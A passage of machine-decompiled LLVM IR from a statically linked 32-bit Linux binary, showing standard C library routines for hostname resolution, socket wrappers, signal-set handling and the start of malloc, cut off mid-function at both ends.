  %v4_804fcaa = call i32 @strncpy(i8* %v3_804fcaa, i32 %arg1, i32 %v1_804fc83)
  %v0_804fcaf = load i32, i32* @edi, align 4
  %v1_804fcaf = load i32, i32* @ebp, align 4
  %v2_804fcaf = add i32 %v1_804fcaf, 12
  %v3_804fcaf = inttoptr i32 %v2_804fcaf to i32*
  store i32 %v0_804fcaf, i32* %v3_804fcaf, align 4
  %v1_804fcb6 = add i32 %v0_804fc96, 16
  %v2_804fcb6 = inttoptr i32 %v1_804fcb6 to i32*
  store i32 0, i32* %v2_804fcb6, align 4
  %v2_804fcbd = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804fcbd, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804fcbf = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804fcc4 = inttoptr i32 %arg1 to i8*
  %v3_804fcc4 = call i32 @inet_aton(i8* %v2_804fcc4, i32 %v0_804fcbf)
  store i32 %v3_804fcc4, i32* %eax.global-to-local, align 4
  %v1_804fccc = icmp eq i32 %v3_804fcc4, 0
  br i1 %v1_804fccc, label %dec_label_pc_804fd08, label %dec_label_pc_804fcd0

dec_label_pc_804fcd0:                             ; preds = %dec_label_pc_804fc96
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804fcd4 = load i32, i32* @edi, align 4
  store i32 %v0_804fcd4, i32* %arg2, align 4
  %v1_804fcd6 = add i32 %tmp18, 8
  %v2_804fcd6 = inttoptr i32 %v1_804fcd6 to i32*
  store i32 2, i32* %v2_804fcd6, align 4
  %v0_804fcdd = load i32, i32* %edx.global-to-local, align 4
  %v1_804fcdd = add i32 %v0_804fcdd, 12
  %v2_804fcdd = inttoptr i32 %v1_804fcdd to i32*
  store i32 4, i32* %v2_804fcdd, align 4
  %v2_804fce4 = load i32, i32* %stack_var_-92, align 4
  %v1_804fce7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fce7 = add i32 %v1_804fce7, 16
  %v3_804fce7 = inttoptr i32 %v2_804fce7 to i32*
  store i32 %v2_804fce4, i32* %v3_804fce7, align 4
  %v1_804fcee = load i32, i32* %edx.global-to-local, align 4
  %v2_804fcee = add i32 %v1_804fcee, 4
  %v3_804fcee = inttoptr i32 %v2_804fcee to i32*
  store i32 %v1_804fc96, i32* %v3_804fcee, align 4
  %v0_804fcf5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fcf5, i32* %v1_804fbc7, align 4
  store i32 0, i32* %v1_804fc15, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fede

dec_label_pc_804fd08:                             ; preds = %dec_label_pc_804fc96
  %v0_804fd08 = call i32 @__open_nameservers()
  store i32 %v0_804fd08, i32* @eax, align 4
  %v2_804fd18 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804fd18, i32* @ebx, align 4
  store i32 %v2_804fd18, i32* %stack_var_-108, align 4
  %v2_804fd1d = call i32 @__pthread_return_void(i32 %v2_804fd18, i32 134552291)
  store i32 %v2_804fd1d, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), i32* %stack_var_-108, align 4
  %v1_804fd29 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a6a8.183 to i32))
  %v0_804fd2e = load i32, i32* @global_var_8060d94.184, align 4
  store i32 %v0_804fd2e, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), i32* @ecx, align 4
  store i32 134552291, i32* @eax, align 4
  store i32 %v2_804fd18, i32* %stack_var_-108, align 4
  %v2_804fd39 = call i32 @__pthread_return_void(i32 %v2_804fd18, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804fd54 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804fd59 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fd59, i32* %eax.global-to-local, align 4
  store i32 %v2_804fd59, i32* %stack_var_-108, align 4
  %v0_804fd63 = load i32, i32* @esi, align 4
  %v7_804fd6a = call i32 @__dns_lookup(i8* %v2_804fcc4, i32 1, i32 %v0_804fd63, i32 ptrtoint (i32* @global_var_8060d88.185 to i32), i32 %v2_804fd59, i32 %v2_804fd54)
  store i32 %v7_804fd6a, i32* %eax.global-to-local, align 4
  %v2_804fd72 = icmp slt i32 %v7_804fd6a, 0
  %v1_804fd74 = icmp eq i1 %v2_804fd72, false
  br i1 %v1_804fd74, label %dec_label_pc_804fd8a, label %dec_label_pc_804fd76

dec_label_pc_804fd76:                             ; preds = %dec_label_pc_804fd08
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804fc15, align 4
  br label %dec_label_pc_804fede

dec_label_pc_804fd8a:                             ; preds = %dec_label_pc_804fd08
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804fd9d = icmp ugt i32 %v1_804fc83, 256
  %v15_804fd9d = icmp eq i32 %v0_804fc83, 300
  %v2_804fda1 = or i1 %v10_804fd9d, %v15_804fd9d
  br i1 %v2_804fda1, label %dec_label_pc_804fe3c, label %dec_label_pc_804fda3

dec_label_pc_804fda3:                             ; preds = %dec_label_pc_804fd8a
  %v3_804fda6 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804fda6, i32* %stack_var_-108, align 4
  %v1_804fdaa = call i32 @free(i32 %v3_804fda6)
  store i32 %v1_804fdaa, i32* %eax.global-to-local, align 4
  store i32 %v3_804fda6, i32* @edi, align 4
  %v3_804fdb0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fdb0, i32* %stack_var_-108, align 4
  %v1_804fdb4 = call i32 @free(i32 %v3_804fdb0)
  store i32 -1, i32* %v1_804fc15, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804feb4

dec_label_pc_804fe3c:                             ; preds = %dec_label_pc_804fd8a
  %v3_804fe41.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804fe45.pre = load i32, i32* @edi, align 4
  store i32 %v0_804fe45.pre, i32* %stack_var_-108, align 4
  %v3_804fe46 = inttoptr i32 %v0_804fe45.pre to i8*
  %v4_804fe46 = call i32 @strncpy(i8* %v3_804fe46, i32 %v3_804fe41.pre, i32 %v1_804fc83)
  store i32 %v4_804fe46, i32* %eax.global-to-local, align 4
  %v3_804fe4c = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804fe4c, i32* %stack_var_-108, align 4
  %v1_804fe50 = call i32 @free(i32 %v3_804fe4c)
  store i32 %v1_804fe50, i32* %eax.global-to-local, align 4
  %v12_804fe58 = icmp eq i32 %tmp10, 1
  %v1_804fe5d = icmp eq i1 %v12_804fe58, false
  br i1 %v1_804fe5d, label %dec_label_pc_804feb9, label %dec_label_pc_804fe5f

dec_label_pc_804fe5f:                             ; preds = %dec_label_pc_804fe3c
  %v0_804fe5f = load i32, i32* @edx, align 4
  %v0_804fe66 = load i32, i32* @ebp, align 4
  store i32 %v0_804fe66, i32* %stack_var_-108, align 4
  %v3_804fe67 = inttoptr i32 %tmp to i16*
  %v4_804fe67 = call i32 @memcpy(i16* %v3_804fe67, i32 4, i32 %v0_804fe5f)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804fe70 = load i32, i32* @edi, align 4
  store i32 %v0_804fe70, i32* %arg2, align 4
  %v1_804fe72 = add i32 %tmp18, 8
  %v2_804fe72 = inttoptr i32 %v1_804fe72 to i32*
  store i32 2, i32* %v2_804fe72, align 4
  %v0_804fe79 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe79 = add i32 %v0_804fe79, 12
  %v2_804fe79 = inttoptr i32 %v1_804fe79 to i32*
  store i32 4, i32* %v2_804fe79, align 4
  %v3_804fe80 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804fe80, i32* %edx.global-to-local, align 4
  %v1_804fe84 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fe84 = add i32 %v1_804fe84, 16
  %v3_804fe84 = inttoptr i32 %v2_804fe84 to i32*
  store i32 %v3_804fe80, i32* %v3_804fe84, align 4
  %v1_804fe8b = load i32, i32* %eax.global-to-local, align 4
  %v2_804fe8b = add i32 %v1_804fe8b, 4
  %v3_804fe8b = inttoptr i32 %v2_804fe8b to i32*
  store i32 %v1_804fc96, i32* %v3_804fe8b, align 4
  %v2_804fe8e = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804fe8e, i32* %eax.global-to-local, align 4
  %v3_804fe8f = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fe8f, i32* %stack_var_-108, align 4
  %v1_804fe93 = call i32 @free(i32 %v3_804fe8f)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804fbc7, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804fc15, align 4
  br label %dec_label_pc_804feb4

dec_label_pc_804feb4:                             ; preds = %dec_label_pc_804feb9, %dec_label_pc_804fda3, %dec_label_pc_804fe5f
  br label %dec_label_pc_804fede

dec_label_pc_804feb9:                             ; preds = %dec_label_pc_804fe3c
  %v3_804febc = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804febc, i32* %stack_var_-108, align 4
  %v1_804fec0 = call i32 @free(i32 %v3_804febc)
  store i32 1, i32* %v1_804fc15, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804feb4

dec_label_pc_804fed9:                             ; preds = %dec_label_pc_804fc83, %dec_label_pc_804fc67, %dec_label_pc_804fc5b, %dec_label_pc_804fc48, %dec_label_pc_804fc3c
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fede

dec_label_pc_804fede:                             ; preds = %dec_label_pc_804fc28, %dec_label_pc_804fc21, %dec_label_pc_804fbdd, %entry, %dec_label_pc_804feb4, %dec_label_pc_804fd76, %dec_label_pc_804fcd0, %dec_label_pc_804fed9
  store i32 %v0_804fbb7, i32* @ebx, align 4
  store i32 %v0_804fbb6, i32* @esi, align 4
  store i32 %v0_804fbb5, i32* @edi, align 4
  store i32 %v0_804fbb4, i32* @ebp, align 4
  %v0_804fee5 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804fee5

; uselistorder directives
  uselistorder i32 %v2_804fd18, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804fc9d, { 1, 0, 2 }
  uselistorder i32 %v1_804fc96, { 1, 0 }
  uselistorder i32 %v1_804fc83, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804fc4c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804fc35, { 1, 0 }
  uselistorder i32 %v2_804fc15, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804fc15, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804fbc7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804fede, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804feb4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fc48, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804ff03 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804ff0a = call i32 @__socketcall(i32 3, i32 %v2_804ff03)
  ret i32 %v2_804ff0a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804ff2f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804ff36 = call i32 @__socketcall(i32 6, i32 %v2_804ff2f)
  ret i32 %v2_804ff36

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804ff6b = ptrtoint i32* %stack_var_-20 to i32
  %v2_804ff72 = call i32 @__socketcall(i32 15, i32 %v2_804ff6b)
  ret i32 %v2_804ff72

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804ff9f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804ffa6 = call i32 @__socketcall(i32 10, i32 %v2_804ff9f)
  ret i32 %v2_804ffa6

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804ffd3 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804ffda = call i32 @__socketcall(i32 9, i32 %v2_804ffd3)
  ret i32 %v2_804ffda

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8050017 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805001e = call i32 @__socketcall(i32 11, i32 %v2_8050017)
  ret i32 %v2_805001e

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8050053 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805005a = call i32 @__socketcall(i32 14, i32 %v2_8050053)
  ret i32 %v2_805005a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805007f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050086 = call i32 @__socketcall(i32 1, i32 %v2_805007f)
  ret i32 %v2_8050086

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 7, 0, 1, 3, 6, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80500a8, label %dec_label_pc_805009b

dec_label_pc_805009b:                             ; preds = %entry
  %v1_805009b = add i32 %arg1, -64
  %v3_805009b = sub i32 63, %arg1
  %v4_805009b = and i32 %v3_805009b, %arg1
  %v5_805009b = icmp slt i32 %v4_805009b, 0
  %v6_805009b = icmp eq i32 %v1_805009b, 0
  %v7_805009b = icmp slt i32 %v1_805009b, 0
  %v3_805009e = icmp eq i1 %v7_805009b, %v5_805009b
  %v4_805009e = icmp eq i1 %v6_805009b, false
  %v5_805009e = and i1 %v4_805009e, %v3_805009e
  br i1 %v5_805009e, label %dec_label_pc_80500a8, label %dec_label_pc_80500a0

dec_label_pc_80500a0:                             ; preds = %dec_label_pc_805009b
  %v4_80500a3 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80500a8

dec_label_pc_80500a8:                             ; preds = %dec_label_pc_805009b, %entry, %dec_label_pc_80500a0
  %v1_80500a8 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80500ad = inttoptr i32 %v1_80500a8 to i32*
  store i32 22, i32* %v1_80500ad, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805009b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80500a8, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80500ca = inttoptr i32 %arg1 to i8*
  %v4_80500ca = call i32 @__GI_memset(i8* %v3_80500ca, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80500d8 = load i32, i32* @ebx, align 4
  %v15_80500d9 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_80500ed = icmp eq i32 %arg2, -1
  br i1 %v10_80500ed, label %dec_label_pc_80500fb, label %dec_label_pc_80500f2

dec_label_pc_80500f2:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_80500fb, label %dec_label_pc_80500f6

dec_label_pc_80500f6:                             ; preds = %dec_label_pc_80500f2
  %v7_80500f9 = icmp sgt i32 %arg1, 64
  br i1 %v7_80500f9, label %dec_label_pc_80500fb, label %dec_label_pc_8050108

dec_label_pc_80500fb:                             ; preds = %dec_label_pc_80500f6, %dec_label_pc_80500f2, %entry
  %v1_80500fb = call i32 @__errno_location(i32 %v0_80500d8)
  store i32 %v1_80500fb, i32* %eax.global-to-local, align 4
  %v1_8050100 = inttoptr i32 %v1_80500fb to i32*
  store i32 22, i32* %v1_8050100, align 4
  br label %dec_label_pc_805017c

dec_label_pc_8050108:                             ; preds = %dec_label_pc_80500f6
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050116

dec_label_pc_8050116:                             ; preds = %dec_label_pc_8050116.dec_label_pc_8050116_crit_edge, %dec_label_pc_8050108
  %v0_8050116 = phi i32 [ %v15_80500d9, %dec_label_pc_8050108 ], [ %v0_8050116.pre, %dec_label_pc_8050116.dec_label_pc_8050116_crit_edge ]
  %v1_805012117 = phi i32 [ 31, %dec_label_pc_8050108 ], [ %v1_8050121, %dec_label_pc_8050116.dec_label_pc_8050116_crit_edge ]
  %v2_8050116 = mul i32 %v1_805012117, 4
  %v3_8050116 = add i32 %v2_8050116, 160
  %v4_8050116 = add i32 %v3_8050116, %v0_8050116
  %v5_8050116 = inttoptr i32 %v4_8050116 to i32*
  store i32 0, i32* %v5_8050116, align 4
  %v0_8050121.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050121 = add i32 %v0_8050121.pre, -1
  %v9_8050121 = icmp slt i32 %v1_8050121, 0
  store i32 %v1_8050121, i32* %eax.global-to-local, align 4
  %v1_8050122 = icmp eq i1 %v9_8050121, false
  br i1 %v1_8050122, label %dec_label_pc_8050116.dec_label_pc_8050116_crit_edge, label %dec_label_pc_8050124

dec_label_pc_8050116.dec_label_pc_8050116_crit_edge: ; preds = %dec_label_pc_8050116
  %v0_8050116.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050116

dec_label_pc_8050124:                             ; preds = %dec_label_pc_8050116
  %v0_8050124 = load i32, i32* @edx, align 4
  %v2_8050127 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8050127, i32* %eax.global-to-local, align 4
  %v4_805012f = call i32 @__sigaddset(i32 %v2_8050127, i32 %arg1, i32 %v0_8050124, i32 %v0_8050124)
  store i32 %v4_805012f, i32* %eax.global-to-local, align 4
  %v2_8050137 = icmp slt i32 %v4_805012f, 0
  br i1 %v2_8050137, label %dec_label_pc_805017c, label %dec_label_pc_805013b

dec_label_pc_805013b:                             ; preds = %dec_label_pc_8050124
  %v4_8050143 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8060980.186 to i32), i32 %arg1, i32 %v4_805012f, i32 %v4_805012f)
  %v2_805015c = ptrtoint i32* %stack_var_-284 to i32
  %v2_8050161 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8050161, i32* %eax.global-to-local, align 4
  %v4_805016a = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_805015c)
  store i32 %v4_805016a, i32* %eax.global-to-local, align 4
  %v2_8050172 = icmp slt i32 %v4_805016a, 0
  br i1 %v2_8050172, label %dec_label_pc_805017c, label %dec_label_pc_8050176

dec_label_pc_8050176:                             ; preds = %dec_label_pc_805013b
  %v3_8050176 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_805017f

dec_label_pc_805017c:                             ; preds = %dec_label_pc_805013b, %dec_label_pc_8050124, %dec_label_pc_80500fb
  br label %dec_label_pc_805017f

dec_label_pc_805017f:                             ; preds = %dec_label_pc_8050176, %dec_label_pc_805017c
  %storemerge = phi i32 [ -1, %dec_label_pc_805017c ], [ %v3_8050176, %dec_label_pc_8050176 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80500d8, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050121, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_805017f, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8050196 = add i32 %arg2, -1
  %v1_8050199 = urem i32 %v1_8050196, 32
  %v2_8050199 = icmp eq i32 %v1_8050199, 0
  %v2_805019c = udiv i32 %v1_8050196, 32
  br i1 %v2_8050199, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805019f = shl i32 1, %v1_8050199
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80501a1 = phi i32 [ 1, %entry ], [ %v5_805019f, %bb ]
  %v2_80501a1 = mul nuw nsw i32 %v2_805019c, 4
  %v3_80501a1 = add i32 %v2_80501a1, %arg1
  %v4_80501a1 = inttoptr i32 %v3_80501a1 to i32*
  %v5_80501a1 = load i32, i32* %v4_80501a1, align 4
  %v7_80501a1 = and i32 %v5_80501a1, %v6_80501a1
  %v8_80501a1 = icmp eq i32 %v7_80501a1, 0
  %v1_80501a5 = icmp eq i1 %v8_80501a1, false
  %v2_80501a5 = zext i1 %v1_80501a5 to i32
  ret i32 %v2_80501a5

; uselistorder directives
  uselistorder i32 %v1_8050199, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80501ac = load i32, i32* @ebx, align 4
  store i32 %v0_80501ac, i32* %stack_var_-4, align 4
  %v1_80501ba = add i32 %arg2, -1
  %v1_80501bd = urem i32 %v1_80501ba, 32
  %v2_80501bd = icmp eq i32 %v1_80501bd, 0
  store i32 %v1_80501bd, i32* @ecx, align 4
  br i1 %v2_80501bd, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_80501c0 = shl i32 1, %v1_80501bd
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_80501c5 = phi i32 [ 1, %entry ], [ %v5_80501c0, %bb ]
  %v2_80501c2 = udiv i32 %v1_80501ba, 32
  store i32 %v2_80501c2, i32* @edx, align 4
  %v2_80501c5 = mul nuw nsw i32 %v2_80501c2, 4
  %v3_80501c5 = add i32 %v2_80501c5, %arg1
  %v4_80501c5 = inttoptr i32 %v3_80501c5 to i32*
  %v5_80501c5 = load i32, i32* %v4_80501c5, align 4
  %v7_80501c5 = or i32 %v5_80501c5, %v6_80501c5
  store i32 %v7_80501c5, i32* %v4_80501c5, align 4
  %v2_80501ca = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80501ca, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80501c2, { 1, 0 }
  uselistorder i32 %v1_80501bd, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80501da = add i32 %arg2, -1
  %v1_80501dd = urem i32 %v1_80501da, 32
  %v2_80501dd = icmp eq i32 %v1_80501dd, 0
  br i1 %v2_80501dd, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_80501e0 = shl i32 -2, %v1_80501dd
  %v5_80501e0 = sub nsw i32 32, %v1_80501dd
  %v6_80501e0 = lshr i32 -2, %v5_80501e0
  %v7_80501e0 = or i32 %v6_80501e0, %v4_80501e0
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_80501e5 = phi i32 [ -2, %entry ], [ %v7_80501e0, %bb ]
  %v2_80501e2 = udiv i32 %v1_80501da, 32
  %v2_80501e5 = mul nuw nsw i32 %v2_80501e2, 4
  %v3_80501e5 = add i32 %v2_80501e5, %arg1
  %v4_80501e5 = inttoptr i32 %v3_80501e5 to i32*
  %v5_80501e5 = load i32, i32* %v4_80501e5, align 4
  %v7_80501e5 = and i32 %v5_80501e5, %v6_80501e5
  store i32 %v7_80501e5, i32* %v4_80501e5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80501dd, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_80501ec = load i32, i32* @eax, align 4
  %v6_80501ff = icmp ugt i32 %v0_80501ec, 16777215
  br i1 %v6_80501ff, label %dec_label_pc_8050210, label %dec_label_pc_8050201

dec_label_pc_8050201:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_80501ec, 256
  %v2_80501ee = udiv i32 %v0_80501ec, 256
  %v2_8050201 = call i32 @llvm.ctlz.i32(i32 %v2_80501ee, i1 true)
  %v3_8050201 = xor i32 %v2_8050201, 31
  %v5_8050201 = select i1 %tmp, i32 95, i32 %v3_8050201
  %v1_8050204 = add nuw nsw i32 %v5_8050201, 6
  store i32 %v1_8050204, i32* @ecx, align 4
  %v2_8050207 = urem i32 %v1_8050204, 32
  %v4_8050207 = icmp eq i32 %v2_8050207, 0
  br i1 %v4_8050207, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8050201
  %v5_8050207 = lshr i32 %v0_80501ec, %v2_8050207
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8050201, %bb
  %v0_8050209 = phi i32 [ %v0_80501ec, %dec_label_pc_8050201 ], [ %v5_8050207, %bb ]
  %v1_8050209 = urem i32 %v0_8050209, 4
  %v2_805020c = mul nuw nsw i32 %v5_8050201, 4
  %v3_805020c = or i32 %v1_8050209, 32
  %v4_805020c = add nuw nsw i32 %v3_805020c, %v2_805020c
  br label %dec_label_pc_8050210

dec_label_pc_8050210:                             ; preds = %entry, %bb4
  %v0_8050211 = phi i32 [ 95, %entry ], [ %v4_805020c, %bb4 ]
  ret i32 %v0_8050211

; uselistorder directives
  uselistorder i32 %v2_8050207, { 1, 0 }
  uselistorder i32 %v0_80501ec, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8050210, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050212 = load i32, i32* @ebp, align 4
  %v0_8050213 = load i32, i32* @edi, align 4
  %v0_8050214 = load i32, i32* @esi, align 4
  %v0_8050215 = load i32, i32* @ebx, align 4
  store i32 %v0_8050215, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050227 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050227, i32* @eax, align 4
  store i32 %v2_8050227, i32* %stack_var_-92, align 4
  %v2_805022c = call i32 @__pthread_return_void(i32 %v2_8050227, i32 134552291)
  store i32 %v2_805022c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a590.187 to i32), i32* %stack_var_-92, align 4
  %v1_8050238 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a590.187 to i32))
  store i32 %v1_8050238, i32* %eax.global-to-local, align 4
